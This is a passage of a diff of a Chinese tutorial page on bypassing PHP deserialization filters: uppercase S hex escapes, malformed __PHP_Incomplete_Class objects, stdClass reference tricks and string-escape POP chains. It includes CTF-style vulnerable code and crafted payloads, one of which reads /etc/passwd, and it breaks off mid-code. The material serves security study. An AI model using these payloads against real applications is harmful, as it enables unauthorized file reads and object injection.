    <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Unicode-绕过"><a href="#Unicode-绕过" class="headerlink" title="Unicode 绕过"></a>Unicode 绕过</h3><p>在PHP序列化和反序列化过程中，字符串类型的标识符是 <code>s</code>，它表示序列化的数据是一个字符串。然而，PHP在某些版本中对大写的 <code>S</code> 进行了特殊处理，将其视为十六进制字符编码。这种特性可以被攻击者利用，以绕过某些检测机制。</p>
+<h3 id="unicode-绕过">Unicode 绕过</h3>
+<p>在PHP序列化和反序列化过程中，字符串类型的标识符是
+<code>s</code>，它表示序列化的数据是一个字符串。然而，PHP在某些版本中对大写的
+<code>S</code>
+进行了特殊处理，将其视为十六进制字符编码。这种特性可以被攻击者利用，以绕过某些检测机制。</p>
 <p>当PHP序列化数据时，通常使用 <code>s</code> 表示字符串类型。例如：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>表示一个长度为4的字符串 “test”。然而，如果使用大写的 <code>S</code>，PHP会将后续的字符视为十六进制编码。例如：</p>
+<p>表示一个长度为4的字符串 "test"。然而，如果使用大写的
+<code>S</code>，PHP会将后续的字符视为十六进制编码。例如：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S:<span class="number">8</span>:<span class="string">&quot;\75sername&quot;</span>;</span><br></pre></td></tr></table></figure></div>
-
-<p>在上述示例中，<code>\75</code> 是字符 <code>u</code> 的十六进制表示。这意味着字符串 <code>S:8:&quot;\75sername&quot;</code> 实际上会被解析为 <code>username</code>。这可以用来绕过某些检测机制，例如字符串匹配检查。</p>
+<p>在上述示例中，<code>\75</code> 是字符 <code>u</code>
+的十六进制表示。这意味着字符串 <code>S:8:"\75sername"</code>
+实际上会被解析为
+<code>username</code>。这可以用来绕过某些检测机制，例如字符串匹配检查。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>) !== False) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span> . PHP_EOL);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未作处理前</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="二次序列化绕过"><a href="#二次序列化绕过" class="headerlink" title="二次序列化绕过"></a>二次序列化绕过</h3><p>首先生成一段序列化数据。</p>
+<h3 id="二次序列化绕过">二次序列化绕过</h3>
+<p>首先生成一段序列化数据。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unknown</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line"><span class="variable">$obj1</span>-&gt;abc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> <span class="title class_">Unknown</span>();</span><br><span class="line"><span class="variable">$obj2</span>-&gt;abc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>([<span class="variable">$obj1</span>, <span class="variable">$obj2</span>]);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;i:1;O:7:&quot;Unknown&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>这段序列化数据反序列化，注意反序列化的 PHP 环境中没有定义 <code>Unknown</code> 类。</p>
+<p>这段序列化数据反序列化，注意反序列化的 PHP 环境中没有定义
+<code>Unknown</code> 类。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;i:1;O:7:&quot;Unknown&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; stdClass Object</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [abc] =&gt; </span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [1] =&gt; __PHP_Incomplete_Class Object</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [__PHP_Incomplete_Class_Name] =&gt; Unknown</span></span><br><span class="line"><span class="comment">            [abc] =&gt; </span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;i:1;O:7:&quot;Unknown&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
 <p>观察反序列后的结果我们发现：</p>
 <ul>
-<li><code>stdClass</code> 是 PHP 内部声明的类，因此可以正常反序列化。</li>
-<li>由于 <strong><code>Unknown</code> 类没有定义</strong>，因此反序列化后：<ul>
-<li><strong>类名变为 <code>__PHP_Incomplete_Class</code>。</strong></li>
-<li><strong>原本的类名作为 <code>__PHP_Incomplete_Class_Name</code> 属性的值。</strong></li>
-<li><code>Unknown</code> 类原本的属性不变。</li>
-</ul>
-</li>
-</ul>
-<p>另外把反序列化的类重新序列化，结果与原本的序列化数据相同。<strong>这说明在序列化的过程中，PHP 针对名称为 <code>__PHP_Incomplete_Class</code> 的类做了特殊处理</strong>。具体来说在序列化过程中 PHP 做了如下操作：</p>
+<li><code>stdClass</code> 是 PHP
+内部声明的类，因此可以正常反序列化。</li>
+<li>由于 <strong><code>Unknown</code>
+类没有定义</strong>，因此反序列化后：
 <ul>
-<li>将 <code>__PHP_Incomplete_Class</code> 中的 <code>__PHP_Incomplete_Class_Name</code> 属性存储的类名替换到类名上。</li>
+<li><strong>类名变为 <code>__PHP_Incomplete_Class</code>。</strong></li>
+<li><strong>原本的类名作为 <code>__PHP_Incomplete_Class_Name</code>
+属性的值。</strong></li>
+<li><code>Unknown</code> 类原本的属性不变。</li>
+</ul></li>
+</ul>
+<p>另外把反序列化的类重新序列化，结果与原本的序列化数据相同。<strong>这说明在序列化的过程中，PHP
+针对名称为 <code>__PHP_Incomplete_Class</code>
+的类做了特殊处理</strong>。具体来说在序列化过程中 PHP 做了如下操作：</p>
+<ul>
+<li>将 <code>__PHP_Incomplete_Class</code> 中的
+<code>__PHP_Incomplete_Class_Name</code>
+属性存储的类名替换到类名上。</li>
 <li>将 <code>__PHP_Incomplete_Class_Name</code> 属性删除。</li>
 </ul>
-<p>虽然从刚才的现象来看，<code>__PHP_Incomplete_Class_Name</code> 和 <code>__PHP_Incomplete_Class_Name</code> 不会出现在序列化的数据中，但是我们可以手动构造序列化中没有特殊处理 <code>__PHP_Incomplete_Class</code> 类时的结果。</p>
+<p>虽然从刚才的现象来看，<code>__PHP_Incomplete_Class_Name</code> 和
+<code>__PHP_Incomplete_Class_Name</code>
+不会出现在序列化的数据中，但是我们可以手动构造序列化中没有特殊处理
+<code>__PHP_Incomplete_Class</code> 类时的结果。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:2:&#123;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:7:&quot;Unknown&quot;;s:3:&quot;abc&quot;;N;&#125;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
-
-<p>不过实际测试发现这段序列化数据与原本的序列化数据效果相同，也就是说 <strong>PHP 在反序列化时同样也会对名称为 <code>__PHP_Incomplete_Class</code> 的类做特殊处理</strong>。</p>
-<p>然而既然 PHP 在反序列化时同样也会对名称为 <code>__PHP_Incomplete_Class</code> 的类做特殊处理，那么我们<strong>在序列化数据中构造一个畸形的 <code>__PHP_Incomplete_Class</code> 的类</strong>可以让这个类<strong>在反序列化时正常恢复，但是再次序列化的时候会消失</strong>，从而绕过一些检查。</p>
-<p>具体构造方法就是<strong>在序列化数据中把 <code>__PHP_Incomplete_Class</code> 类的 <code>__PHP_Incomplete_Class_Name</code> 属性删掉</strong>。</p>
+<p>不过实际测试发现这段序列化数据与原本的序列化数据效果相同，也就是说
+<strong>PHP 在反序列化时同样也会对名称为
+<code>__PHP_Incomplete_Class</code> 的类做特殊处理</strong>。</p>
+<p>然而既然 PHP 在反序列化时同样也会对名称为
+<code>__PHP_Incomplete_Class</code>
+的类做特殊处理，那么我们<strong>在序列化数据中构造一个畸形的
+<code>__PHP_Incomplete_Class</code>
+的类</strong>可以让这个类<strong>在反序列化时正常恢复，但是再次序列化的时候会消失</strong>，从而绕过一些检查。</p>
+<p>具体构造方法就是<strong>在序列化数据中把
+<code>__PHP_Incomplete_Class</code> 类的
+<code>__PHP_Incomplete_Class_Name</code> 属性删掉</strong>。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; stdClass Object</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [abc] =&gt; </span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [1] =&gt; __PHP_Incomplete_Class Object</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [abc] =&gt; </span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>)));</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;abc&quot;;N;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; stdClass Object</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [abc] =&gt; </span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [1] =&gt; __PHP_Incomplete_Class Object</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
-
 <p>例如下面这段代码：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name) <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfer&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/MyClass/i&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>))) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error: Class &#x27;MyClass&#x27; found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
 <p>这段代码会先将输入进行反序列化，然后根据二次序列化的结果进行过滤。因此我们只要构造这样一段数据：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;MyClass&quot;:1:&#123;s:4:&quot;name&quot;;s:11:&quot;/etc/passwd&quot;;&#125;&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<p>那么就可以在二次序列化的时候隐藏 <code>MyClass</code> 类名实现绕过：<br><img  
+<p>那么就可以在二次序列化的时候隐藏 <code>MyClass</code> 类名实现绕过：
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/5d629c5002cb18566cdaabce0fca4b4d.png"
-                      alt="在这里插入图片描述"
+                     data-src="images/5d629c5002cb18566cdaabce0fca4b4d.png"
+                     
+alt="在这里插入图片描述" 
                 ></p>
-<h2 id="无对象绕过"><a href="#无对象绕过" class="headerlink" title="无对象绕过"></a>无对象绕过</h2><p><code>stdClass</code> 是 PHP 中的一个内置类，用于创建一个通用的对象。<code>stdClass</code> 对象通常用于创建一个空对象，它没有预定义的属性或方法。这对于将数据存储在一个具有动态属性的结构中非常有用，因为你可以随时添加和删除属性。</p>
-<p><strong>如果序列化字符串中的对象类型没有定义过会反序列化出 <code>__PHP_Incomplete_Class</code> 类型的对象，这个对象中的属性不能直接访问，会影响后续执行流程。</strong></p>
-<p>因此当题目没有给出一个现有的类时，可以考虑使用内置类 <code>stdClass</code>，<code>stdClass</code> 没有杂七杂八的方法和变量，在构造 exp 时可以避免一些其他内置类可能产生的错误。</p>
+<h2 id="无对象绕过">无对象绕过</h2>
+<p><code>stdClass</code> 是 PHP
+中的一个内置类，用于创建一个通用的对象。<code>stdClass</code>
+对象通常用于创建一个空对象，它没有预定义的属性或方法。这对于将数据存储在一个具有动态属性的结构中非常有用，因为你可以随时添加和删除属性。</p>
+<p><strong>如果序列化字符串中的对象类型没有定义过会反序列化出
+<code>__PHP_Incomplete_Class</code>
+类型的对象，这个对象中的属性不能直接访问，会影响后续执行流程。</strong></p>
+<p>因此当题目没有给出一个现有的类时，可以考虑使用内置类
+<code>stdClass</code>，<code>stdClass</code>
+没有杂七杂八的方法和变量，在构造 exp
+时可以避免一些其他内置类可能产生的错误。</p>
 <p>例如下面这段代码：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;this_is_a_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>我们可以直接构造一个 <code>stdClass</code> 类型的对象完成利用。另外还要绕过一些检查：</p>
+<p>我们可以直接构造一个 <code>stdClass</code>
+类型的对象完成利用。另外还要绕过一些检查：</p>
 <ul>
 <li>使用 Unicode 字符串绕过对 <code>flag</code> 的过滤。</li>
-<li>通过指针引用让对象中的 <code>flag</code> 和一个其他成员指向同一字符串。</li>
+<li>通过指针引用让对象中的 <code>flag</code>
+和一个其他成员指向同一字符串。</li>
 </ul>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;S:4:&quot;\66\6c\61\67&quot;;S:4:&quot;\66\6c\61\67&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><p>反序列化字符串逃逸就是利用序列化和反序列化之间存在对序列化数据长度的改变，造成类型混淆（例如把原本的字符串类型成员转变为对象成员），从而在用户不能完全控制序列化字符串的情况下构造 POP 链完成利用。</p>
-<h2 id="长到短替换"><a href="#长到短替换" class="headerlink" title="长到短替换"></a>长到短替换</h2><p>例如下面这段代码：</p>
+<h1 id="反序列化字符逃逸">反序列化字符逃逸</h1>
+<p>反序列化字符串逃逸就是利用序列化和反序列化之间存在对序列化数据长度的改变，造成类型混淆（例如把原本的字符串类型成员转变为对象成员），从而在用户不能完全控制序列化字符串的情况下构造
+POP 链完成利用。</p>
+<h2 id="长到短替换">长到短替换</h2>
+<p>例如下面这段代码：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;hello&#x27;</span> . <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span 